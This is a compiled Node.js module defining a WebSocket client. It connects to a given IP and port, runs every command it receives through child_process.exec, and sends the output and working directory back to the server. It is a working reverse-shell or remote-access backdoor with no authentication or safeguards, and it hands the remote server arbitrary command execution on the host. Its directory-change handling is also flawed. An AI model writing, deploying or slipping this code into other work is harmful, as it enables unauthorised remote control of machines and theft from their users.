"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.ClientSocket = exports.SocketAction = void 0;
const ws_1 = require("ws");
const child_process_1 = require("child_process");
const path_1 = __importDefault(require("path"));
var SocketAction;
(function (SocketAction) {
    SocketAction[SocketAction["Command"] = 0] = "Command";
    SocketAction[SocketAction["Message"] = 1] = "Message";
    SocketAction[SocketAction["CWDGetter"] = 2] = "CWDGetter";
})(SocketAction = exports.SocketAction || (exports.SocketAction = {}));
class ClientSocket {
    get socketServerAdress() {
        return "ws://" + this.ip + ":" + this.socketPort;
    }
    constructor(ip, socketPort) {
        this.ip = ip;
        this.socketPort = socketPort;
        this.socketClient = new ws_1.WebSocket(this.socketServerAdress);
        this.cwd = process.cwd();
        this.socketClient.on("message", function (message) {
            console.log("[x] Received : " + message);
            let parsedMessage = JSON.parse(message);
            if (parsedMessage.socketAction == SocketAction.Command) {
                if (parsedMessage.command.includes("cd"))
                    this.cwd = path_1.default.join(this.cwd, parsedMessage.command.substring(3));
                (0, child_process_1.exec)(parsedMessage.command, { cwd: this.cwd }, function (error, stdout, stderr) {
                    if (error) {
                        this.socketClient.send(JSON.stringify({ cwd: this.cwd, stdout: stderr, closed: true }));
                        return;
                    }
                    this.socketClient.send(JSON.stringify({ cwd: this.cwd, stdout, closed: true }));
                }.bind(this));
                // child.stdout.on('data', function(this:ClientSocket, stdout:string)
                // {
                //     this.socketClient.send(JSON.stringify({cwd:this.cwd, stdout, closed:false}));
                // }.bind(this));
                // child.stderr.on('data', function(this:ClientSocket, stderr:string)
                // {
                //     this.socketClient.send(JSON.stringify({cwd:this.cwd, stdout:stderr, closed:false}));
                // }.bind(this));
                // child.on('close', function(this:ClientSocket, code:number)
                // {
                //     this.socketClient.send(JSON.stringify({cwd:this.cwd, stdout:"", closed:true}));
                // }.bind(this));
            }
            if (parsedMessage.socketAction == SocketAction.Message) {
                // alert(parsedMessage.message);
                // dialog.showMessageBox({message:parsedMessage.message});
            }
            if (parsedMessage.socketAction == SocketAction.CWDGetter) {
                // alert(parsedMessage.message);
                // dialog.showMessageBox({message:parsedMessage.message});
                this.socketClient.send(JSON.stringify({ cwd: this.cwd }));
            }
        }.bind(this));
    }
}
exports.ClientSocket = ClientSocket;
